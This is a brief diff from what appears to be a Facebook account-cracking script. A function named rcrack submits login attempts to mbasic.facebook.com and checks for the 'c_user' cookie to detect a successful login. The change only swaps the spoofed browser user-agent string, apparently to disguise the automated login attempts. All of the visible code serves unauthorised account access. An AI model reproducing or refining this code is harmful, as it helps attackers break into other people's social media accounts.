@@ -241,7 +241,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5562.220 Safari/537.36',}
+            'user-agent': 'Mozilla/5.0 (Macintosh; PPC Mac OS X 10.5; rv:31.0) Gecko/20100101 Firefox/30.0 TenFourFox/7477',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
